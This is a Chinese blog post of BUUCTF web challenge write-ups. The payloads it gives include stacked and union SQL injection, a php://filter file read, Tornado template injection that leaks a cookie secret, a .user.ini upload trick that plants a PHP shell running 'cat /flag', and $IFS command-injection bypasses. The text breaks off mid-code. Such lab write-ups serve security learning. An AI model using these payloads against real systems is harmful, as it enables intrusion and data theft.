<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF web部分题解 | R4in1's Blog</title><meta name="author" content="R4in1,1582612801@qq.com"><meta name="copyright" content="R4in1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="记录一下在buuoj上刷的题目">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTF web部分题解">
<meta property="og:url" content="https://r4in1.github.io/2020/12/02/BUUCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html">
<meta property="og:site_name" content="R4in1&#39;s Blog">
<meta property="og:description" content="记录一下在buuoj上刷的题目">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg">
<meta property="article:published_time" content="2020-12-02T12:26:04.000Z">
<meta property="article:modified_time" content="2020-12-02T12:50:29.993Z">
<meta property="article:author" content="R4in1">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://r4in1.github.io/2020/12/02/BUUCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}

// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
const getScript = url => new Promise((resolve, reject) => {
  const script = document.createElement('script')
  script.src = url
  script.async = true
  script.onerror = reject
  script.onload = script.onreadystatechange = function() {
    const loadState = this.readyState
    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
    script.onload = script.onreadystatechange = null
    resolve()
  }
  document.head.appendChild(script)
})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-12-02 20:50:29'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="R4in1's Blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/R4in1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">R4in1's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF web部分题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-02T12:26:04.000Z" title="发表于 2020-12-02 20:26:04">2020-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-12-02T12:50:29.993Z" title="更新于 2020-12-02 20:50:29">2020-12-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/WEB/">WEB</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>搬运自原博客</p>
<p>接上一个关于buuoj上的题解，确实题很多，慢慢刷吧</p>
<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>唉，大佬做题都是习惯在题目上标上Easy，本菜鸡已无力吐槽（自己菜还能怪谁。。。）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Give me your flag, I will tell you if the flag is right.</span><br><span class="line">输入框</span><br></pre></td></tr></table></figure>
<p>只有一个输入框，输入查询的东西，只有三种回显，一个是数组，一个是Nonono，一个是返回空，猜测Nonono应该是检测到了敏感词，其他的不知道了，又是日常搜题解<br>参考题解之后，知道是堆叠注入，而且输入的内容并不是往常的sql注入一样是参数，而是列名，后端的查询语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;query&#x27;</span>].<span class="string">&quot;||flag from Flag&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>蒙了呀，，，这咋猜啊</p>
<p>根据大佬们的wp，这题有两种解法</p>
<h5 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
<p><code>sql_mode=PIPES_AS_CONCAT</code>是将<code>||</code>由<code>or</code>变为拼接字符串，在Oracle中是缺省支持的，但是在mysql中缺省不支持，这样的话,<code>select</code>只会查<code>||</code>之前的那一列，设置时候会将两列的结果合并，本地测试结果：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set sql_mode=pipes_as_concat;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 111||username from users limit 1;</span><br><span class="line">+<span class="comment">---------------+</span></span><br><span class="line">| 111||username |</span><br><span class="line">+<span class="comment">---------------+</span></span><br><span class="line">| 111Dumb       |</span><br><span class="line">+<span class="comment">---------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
<h5 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h5><p>直接输入<code>*,1</code>，因为<code>*</code>是通配符，直接将所有的列查询出来，flag也就出来了</p>
<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>不会（菜的理直气壮）<br>大佬的wp：<br><a href='https://www.jianshu.com/p/f92311564ad0' target='_blank' rel="noopener noreferrer">HCTF2018-admin</a><br><a href='https://www.anquanke.com/post/id/164086#h3-13' target='_blank' rel="noopener noreferrer">一题三解之2018HCTF admin</a></p>
<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>这题主要就是涉及抓包以及文件包含，打开链接之后是个黑色的页面，显示“把一切都放在那里了，去找吧”</p>
<p>说实话我是鼠标乱划拉，划拉到页面下方的中间位置看到浏览器左下角有链接的提示，实际上也可以通过右键查看源代码，发现有个链接，访问之后提示让点击SECRET按钮<br>点击之后却返回一个页面显示说“查阅结束，没看清么？回去再仔细看看吧。”</p>
<p>猜测应该是存在页面跳转，用Burp Suite抓包可以看到有个返回的html页面中的注释<code>secr3t.php</code><br>访问<code>secr3t.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后按提示访问<code>flag.php</code>，结果页面上没有显示，那么flag应该是保存在<code>falg.php</code>中的某个变量中，可以利用<code>secr3t.php</code>中的文件包含，利用php的filter协议读取<code>flag.php</code></p>
<p>构造payload：<br><code>?file=php://filter/convert.base64-encode/resource=flag.php</code><br>然后再将结果base64解码就有结果了<br>可参考：<br><a href='https://blog.csdn.net/nzjdsds/article/details/82461043' target='_blank' rel="noopener noreferrer">php伪协议的一些总结</a></p>
<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>打开靶机是个文件列表，只有三个文件，根据题目，Tornado是使用Python编写的Web服务器兼Web应用框架，那么这题很可能与ssti有关</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt        <span class="comment">//flag in /fllllllllllllag</span></span><br><span class="line">/welcome.txt     <span class="comment">//render</span></span><br><span class="line">/hints.txt       <span class="comment">//md5(cookie_secret+md5(filename))</span></span><br></pre></td></tr></table></figure>
<p>注释后面是打开文件后的内容，观察打开文件后的<code>url</code>，<code>flag.txt</code>的<code>url</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e8c959bd-9e7f-4024-a8aa-02b012ae6b1b.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;9d2667d483e4cb5a237908e3e552d3a0</span><br></pre></td></tr></table></figure>
<p>看样子<code>filename</code>即是要打开的文件，然后根据<code>hints.txt</code>可以猜测，<code>filehash</code>即为文件签名，签名方式即为<code>hints.txt</code>中的方式，那么就还需要知道<code>cookie_secret</code><br>有关<code>render</code>函数的文章：<br><a href='https://blog.csdn.net/qq78827534/article/details/80792514' target='_blank' rel="noopener noreferrer">render函数介绍，以及 render: h =&gt; h(App)</a></p>
<p>然后根据其他大佬的思路，在burpsuite里是找不到<code>cookie</code>的，应该就是存在服务端了，然后根据报错页面（随便改一个文件的签名就会有404页面）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e8c959bd-9e7f-4024-a8aa-02b012ae6b1b.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure>
<p>其中<code>msg</code>参数存在模板注入，经过测试屏蔽了很多特殊字符，输入<code>&#123;&#123;1^1&#125;&#125;</code>或者<code>&#123;&#123;1^0&#125;&#125;</code>可以进行异或运算</p>
<p>然后就不会了（再次菜的理直气壮），翻了一（亿）下别人的wp：<br><a href='https://www.jianshu.com/p/4acb1dfc1b9f' target='_blank' rel="noopener noreferrer">学习笔记2.护网杯 2018 easy_tornado</a></p>
<p>然后直接用<code>msg=&#123;&#123;handler.settings&#125;&#125;</code>就可以获得<code>cookie_secret</code>了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;autoreload&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;compiled_template_cache&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;3970aa6c-cbfd-4f76-8f21-8d2972867169&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>然后计算文件对应的签名就可以拿到flag了，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;5a0ab60fd2f5e61767ec46a3a8785553</span><br></pre></td></tr></table></figure>
<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>文件上传，emmm，只会传一句话，日常搜题解</p>
<p>直接上传php一句话文件是不行的，提示<code>illegal suffix!</code>非法后缀，直接改为<code>jpg</code>结尾也不行，回显<code>&lt;? in contents!</code><br>随便传个内容试一下，文件名<code>123.jpg</code>，内容<code>test</code>，回显<code>exif_imagetype:not image!</code>，<code>exif_imagetype()</code>函数通过获取文件的第一个字节并检查签名来判断是哪种图片，不是图片则返回<code>false</code></p>
<p>上传文件内容添加gif头<code>GIF89a</code>，上传成功，返回上传目录，以及目录下的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your dir uploads/<span class="number">76</span>d9f00467e5ee6abc3ca60892ef304e</span><br><span class="line">Your files :</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;123.jpg&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
<p>分别是本目录<code>.</code>上层目录<code>..</code>和本目录下的<code>index.php</code>以及刚上传的<code>123.jpg</code><br>目前已知信息：</p>
<ul>
<li>上传文件会经过黑名单过滤，不允许出现<code>&lt;?</code></li>
<li>上传文件中必须存在图片文件的开头hex值</li>
</ul>
<p>剩下的就不会了（理直气壮）<br>开始面向wp做题，看到大佬的wp说道可以上传<code>.user.ini</code>文件来实现在php文件中引入类似<code>require(&#39;file&#39;)</code>的效果</p>
<p>在<code>.user.ini</code>中设置<code>auto_prepend_file=shell.jpg</code>，就可以在<code>index.php</code>中自动添加<code>shell.jpg</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先上传<span class="string">&#x27;xxx.jpg&#x27;</span></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;system(<span class="string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">然后上传<span class="string">&#x27;.user.ini&#x27;</span></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=xxx.jpg</span><br><span class="line"></span><br><span class="line">然后访问</span><br><span class="line">http:<span class="comment">//.../uploads/76d9f00467e5ee6abc3ca60892ef304e/index.php</span></span><br><span class="line">成功getflag</span><br></pre></td></tr></table></figure>
<p>参考链接</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11455355.html">https://www.cnblogs.com/20175211lyz/p/11455355.html</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6091#toc-1">https://xz.aliyun.com/t/6091#toc-1</a></li>
<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></li>
</ul>
<h3 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h3><p>做个misc压压惊（菜鸡只会misc）<br>下载压缩包，解压后得到KEY.exe，但是电脑却无法运行，拖到winhex里看到直接就是base64编码的图片，base64解码之后得到二维码，然后扫码get flag<br>放几个base解码编码的网站：</p>
<ul>
<li><a href='http://tool.chinaz.com/Tools/Base64.aspx' target='_blank' rel="noopener noreferrer">base64</a></li>
<li><a href='http://tool.chinaz.com/tools/imgtobase' target='_blank' rel="noopener noreferrer">base64 to img</a></li>
<li><a href='https://www.qqxiuzi.cn/bianma/base.php' target='_blank' rel="noopener noreferrer">base64 /32 /16</a></li>
</ul>
<h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>登录界面，输入参数之后提交到<code>check.php</code>，直接用的<code>get</code>方式，单引号可以看到报错信息，payload：<code>uname=a&#39; or &#39;&#39;=&#39;&amp;passwd=a&#39; or &#39;&#39;=&#39;</code></p>
<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>接上一题，联合查询注入（这题我会！），上一题的payload可以成功登陆而且给了admin的密码，但是没啥卵用，题目上说flag放在其他地方了，先<code>order by</code>得出有三列</p>
<p>然后<code>uname=a&amp;passwd=a&#39; union select 1,2,&#39;3</code>可以看到有2和3两个回显，<code>database()</code>得到数据库<code>geek</code>（其实这一步报错也能看到，我是手滑函数名输错了，然后提示<code>FUNCTION geek.databse does not exist</code>，那看来数据库就是<code>geek</code>了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;a&amp;passwd&#x3D;a&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;geek</span><br><span class="line">&#x2F;&#x2F;查到两张表geekuser,l0ve1ysq1</span><br><span class="line">uname&#x3D;a&amp;passwd&#x3D;a&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1</span><br><span class="line">&#x2F;&#x2F;查到三列id,username,password</span><br><span class="line">uname&#x3D;a&amp;passwd&#x3D;a&#39; union select 1,group_concat(username),group_concat(password) from l0ve1ysq1#</span><br><span class="line">&#x2F;&#x2F;查到一大堆东西，其中password字段最后一行是flag</span><br></pre></td></tr></table></figure>
<p>总结一下就是个简单的联合查询注入，，，很经典的题，没有任何过滤，sqlmap应该能直接注入（可惜我不会用，就当练手了吧），毕竟人家出题人都说了“sqlmap是没有灵魂的”（话说要是会用sqlmap谁还管你有没有灵魂）</p>
<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>双写绕过，如果查询语句只经过了一次过滤，过滤方式为把关键字删除，那么直接将所有被过滤的关键字双写即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or --&gt;oORr</span><br><span class="line">from --&gt; fFROMrom</span><br><span class="line">union --&gt; uUNIONnion</span><br><span class="line">select --&gt; sSELECTelect</span><br><span class="line">where --&gt; wWHEREhere</span><br><span class="line">information_schema --&gt; infoORrmation_schema</span><br><span class="line">password --&gt; passwoORrd</span><br></pre></td></tr></table></figure>
<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>命令执行，但是按照别人的题解，只返回了<code>index.php</code>的部分源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1;cat$IFS&#96;ls&#96;</span><br></pre></td></tr></table></figure>
<p>也尝试了变量拼接，注意源码中的正则匹配是不允许有<code>.*f.*l.*a.*g.*</code>也就是顺序也不能是flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1;a&#x3D;ag.php;b&#x3D;fl;cat$FS$b$a  &#x2F;&#x2F;注意不能是a&#x3D;fl;b&#x3D;ag.php</span><br></pre></td></tr></table></figure>
<p>但是依然没有回显，然后用管道符连接执行<code>od -c</code>查看</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=ag.php;b=fl;cat$IFS$b$a|od$IFS-c</span><br><span class="line">//成功得到回显</span><br><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br><span class="line">0000000   &lt;   ?   p   h   p  \r  \n   $   f   l   a   g       =       &quot;</span><br><span class="line">0000020   f   l   a   g   &#123;   e   a   e   b   6   f   3   4   -   3   f</span><br><span class="line">0000040   e   d   -   4   2   0   2   -   8   e   2   8   -   7   8   5</span><br><span class="line">0000060   7   b   4   a   6   4   d   4   a   &#125;   &quot;   ;  \r  \n   ?   &gt;</span><br><span class="line">0000100  \r  \n</span><br><span class="line">0000102</span><br></pre></td></tr></table></figure>
<p>mdzz。。。刚刚重新试了一下，右键查看源代码就行了。。。没必要费事用<code>od -c</code>，可能是浏览器的锅，应该是浏览器识别为php代码了<br>index.php的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span 